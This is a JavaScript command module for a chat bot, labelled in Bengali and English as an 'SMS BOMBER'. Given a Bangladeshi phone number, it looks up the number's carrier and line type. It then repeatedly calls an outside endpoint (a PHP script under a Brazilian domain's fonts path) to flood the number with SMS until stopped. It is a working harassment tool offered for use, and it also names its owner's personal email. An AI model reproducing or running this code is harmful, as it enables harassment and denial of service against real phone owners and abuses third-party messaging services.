module.exports.config = {
  name: "sms",
  version: "2.5.0",
  hasPermssion: 0,
  credits: "CYBER BOT TEAM | Owner: Nur Nabi Khan | Email: nurnobikhan2642@gmail.com",
  description: "অনবরত এসএমএস বোম্বার, বন্ধ করতে /sms off",
  commandCategory: "Tool",
  usages: "/sms 01xxxxxxxxx অথবা /sms off",
  cooldowns: 0,
  dependencies: { "axios": "" }
};

const axios = require("axios");
const bombingFlags = {};
const NUMLOOKUP_API_KEY = "YOUR_NUMLOOKUP_API_KEY_HERE"; // তোমার API key বসাও

function getFormattedDateTime() {
  const now = new Date();
  const months = ["জানুয়ারি", "ফেব্রুয়ারি", "মার্চ", "এপ্রিল", "মে", "জুন", "জুলাই", "আগস্ট", "সেপ্টেম্বর", "অক্টোবর", "নভেম্বর", "ডিসেম্বর"];
  const day = now.getDate();
  const month = months[now.getMonth()];
  const year = now.getFullYear();

  let hours = now.getHours();
  const minutes = now.getMinutes().toString().padStart(2, "0");
  const ampm = hours >= 12 ? "PM" : "AM";
  hours = hours % 12 || 12;

  return `${day} ${month} ${year} | ${hours}:${minutes} ${ampm}`;
}

async function getPhoneInfo(number) {
  try {
    const response = await axios.get(`https://api.numlookupapi.com/v1/validate/${number}?apikey=${NUMLOOKUP_API_KEY}`);
    return response.data;
  } catch (error) {
    return null;
  }
}

module.exports.run = async ({ api, event, args }) => {
  const threadID = event.threadID;
  const number = args[0];

  if (!number) {
    return api.sendMessage(
      `•┄┅════❁🌺❁════┅┄•
☠️ SMS BOMBER BY CYBER BOT TEAM 💣
👤 Owner: Nur Nabi Khan
📧 Email: \`nurnobikhan2642@gmail.com\`

ব্যবহার:
/sms 01xxxxxxxxx

(শুধু মজার জন্য ব্যবহার করুন)
•┄┅════❁🌺❁════┅┄•`,
      threadID
    );
  }

  if (number.toLowerCase() === "off") {
    if (bombingFlags[threadID]) {
      bombingFlags[threadID] = false;
      return api.sendMessage(
        "✅ SMS বোম্বার বন্ধ করা হয়েছে।\n\n👤 Owner: Nur Nabi Khan\n📧 Email: `nurnobikhan2642@gmail.com`",
        threadID
      );
    } else {
      return api.sendMessage("❗এই থ্রেডে কোন বোম্বিং চলছিল না।", threadID);
    }
  }

  if (!/^01[0-9]{9}$/.test(number)) {
    return api.sendMessage(
      `•┄┅════❁🌺❁════┅┄•
☠️ SMS BOMBER BY CYBER BOT TEAM 💣
👤 Owner: Nur Nabi Khan
📧 Email: \`nurnobikhan2642@gmail.com\`

ব্যবহার:
/sms 01xxxxxxxxx

(শুধু মজার জন্য ব্যবহার করুন)
•┄┅════❁🌺❁════┅┄•`,
      threadID
    );
  }

  if (bombingFlags[threadID]) {
    return api.sendMessage("❗এই থ্রেডে ইতিমধ্যে বোম্বিং চলছে! বন্ধ করতে /sms off", threadID);
  }

  const dateTime = getFormattedDateTime();

  api.sendMessage(
    `✅ SMS বোম্বিং শুরু হয়েছে ${number} নম্বরে...\n🕒 সময়: ${dateTime}\n\n📍 লোকেশন তথ্য সংগ্রহ করা হচ্ছে...\nবন্ধ করতে /sms off`,
    threadID
  );

  const info = await getPhoneInfo(`+88${number}`);
  let infoText = "";

  if (info && info.valid) {
    infoText =
      `🌍 লোকেশন তথ্য:\n` +
      `▪ Country: ${info.country_name || "Unknown"}\n` +
      `▪ Carrier: ${info.carrier || "Unknown"}\n` +
      `▪ Line Type: ${info.line_type || "Unknown"}`;
  } else {
    infoText = "⚠️ লোকেশন তথ্য পাওয়া যায়নি বা API Key ভুল।";
  }

  api.sendMessage(infoText, threadID);

  bombingFlags[threadID] = true;

  (async function startBombing() {
    while (bombingFlags[threadID]) {
      try {
        await axios.get(`https://ultranetrn.com.br/fonts/api.php?number=${number}`);
      } catch (err) {
        api.sendMessage(`❌ ত্রুটি: ${err.message}`, threadID);
        bombingFlags[threadID] = false;
        break;
      }
    }
  })();
};
